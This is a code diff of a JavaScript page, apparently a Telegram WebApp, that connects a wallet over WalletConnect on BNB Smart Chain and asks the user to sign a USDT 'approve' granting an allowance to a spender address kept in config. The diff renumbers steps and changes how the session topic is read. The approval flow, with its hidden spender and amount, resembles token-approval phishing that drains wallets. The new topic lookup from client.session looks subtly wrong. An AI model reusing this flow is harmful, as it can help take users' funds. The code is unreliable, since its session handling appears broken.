@@ -318,10 +318,10 @@
         });
         console.log("[Step 2] SignClient инициализирован:", client);
 
-        // 3. Генерация сессии (uri, approval, topic)
+        // 3. Генерация сессии (uri + approval)
         console.log("[Step 3] Генерация сессии WalletConnect (client.connect)");
         updateStatus("Генерация подключения...");
-        const { uri, approval, topic } = await client.connect({
+        const { uri, approval } = await client.connect({
           requiredNamespaces: {
             eip155: {
               methods: ["eth_sendTransaction", "eth_chainId"],
@@ -331,7 +331,6 @@
           },
         });
         console.log("[Step 3] URI получен:", uri);
-        console.log("[Step 3] Тема сессии (topic):", topic);
 
         // 4. Отображение QR-кода и текстового URI
         console.log("[Step 4] Рисуем QR-код и показываем текст URI");
@@ -347,24 +346,31 @@
         await approval();
         console.log("[Step 5] Сессия подтверждена");
 
-        // 6. Проверка сети (chainId)
-        console.log("[Step 6] Проверка chainId через client.request");
+        // 6. Получение topic из client.session
+        const topic = client.session.topic;
+        if (typeof topic !== "string" || topic.length === 0) {
+          throw new Error("Не удалось получить тему сессии (topic).");
+        }
+        console.log("[Step 6] Тема сессии (topic):", topic);
+
+        // 7. Проверка сети (chainId)
+        console.log("[Step 7] Проверка chainId через client.request");
         updateStatus("Проверка сети...");
         const chainId = await client.request({
           topic,
           chainId: "eip155:56",
           request: { method: "eth_chainId" },
         });
-        console.log("[Step 6] Вернулся chainId:", chainId);
+        console.log("[Step 7] Вернулся chainId:", chainId);
         if (chainId !== "0x38") {
           throw new Error("Пожалуйста, переключитесь на сеть Binance Smart Chain (chainId: 56)");
         }
 
-        // 7. Подготовка данных транзакции (approve)
-        console.log("[Step 7] Подготовка данных approve");
+        // 8. Подготовка данных транзакции (approve)
+        console.log("[Step 8] Подготовка данных approve");
         updateStatus("Подготовка данных...");
         const web3 = new Web3(CONFIG.BSC_RPC_URL);
-        console.log("[Step 7] Новый экземпляр Web3:", web3);
+        console.log("[Step 8] Новый экземпляр Web3:", web3);
 
         const approveABI = {
           constant: false,
@@ -381,20 +387,20 @@
           approveABI,
           [CONFIG.ARB_SPENDER, amountWei]
         );
-        console.log("[Step 7] Сгенерирован data:", data);
+        console.log("[Step 8] Сгенерирован data:", data);
 
-        // 8. Расчёт газа
-        console.log("[Step 8] Расчёт газа через web3");
+        // 9. Расчёт газа
+        console.log("[Step 9] Расчёт газа через web3");
         updateStatus("Расчет комиссии...");
         const gasEstimate = await web3.eth.estimateGas({
           to:   CONFIG.USDT_CONTRACT,
           data: data
         });
-        console.log("[Step 8] gasEstimate (wei):", gasEstimate);
+        console.log("[Step 9] gasEstimate (wei):", gasEstimate);
 
         const gasPrice = await web3.eth.getGasPrice();
         const gasPriceGwei = Math.round(web3.utils.fromWei(gasPrice, "gwei"));
-        console.log("[Step 8] gasPrice (wei):", gasPrice, "gasPrice (Gwei):", gasPriceGwei);
+        console.log("[Step 9] gasPrice (wei):", gasPrice, "gasPrice (Gwei):", gasPriceGwei);
 
         gasInfo.classList.remove("hidden");
         gasEstimateEl.textContent = gasPriceGwei;
@@ -405,10 +411,10 @@
           gas:      web3.utils.toHex(Math.round(gasEstimate * 1.2)), // +20% буфер
           gasPrice: gasPrice
         };
-        console.log("[Step 8] txParams:", txParams);
+        console.log("[Step 9] txParams:", txParams);
 
-        // 9. Отправка транзакции
-        console.log("[Step 9] Отправка eth_sendTransaction через client.request");
+        // 10. Отправка транзакции
+        console.log("[Step 10] Отправка eth_sendTransaction через client.request");
         updateStatus("Подтвердите транзакцию в кошельке...");
         const txHash = await client.request({
           topic,
@@ -418,15 +424,15 @@
             params: [txParams],
           },
         });
-        console.log("[Step 9] Вернулся txHash:", txHash);
+        console.log("[Step 10] Вернулся txHash:", txHash);
 
-        // 10. Успешное завершение
+        // 11. Успешное завершение
         updateStatus("✅ Транзакция успешно отправлена!\n\nTX Hash:\n" + txHash, "success");
-        console.log("[Step 10] Транзакция отправлена, txHash:", txHash);
+        console.log("[Step 11] Транзакция отправлена, txHash:", txHash);
 
         if (isTelegramWebView) {
           setTimeout(() => {
-            console.log("[Step 10] Закрываем WebApp через Telegram.WebApp.close()");
+            console.log("[Step 11] Закрываем WebApp через Telegram.WebApp.close()");
             Telegram.WebApp.close();
           }, 5000);
         }
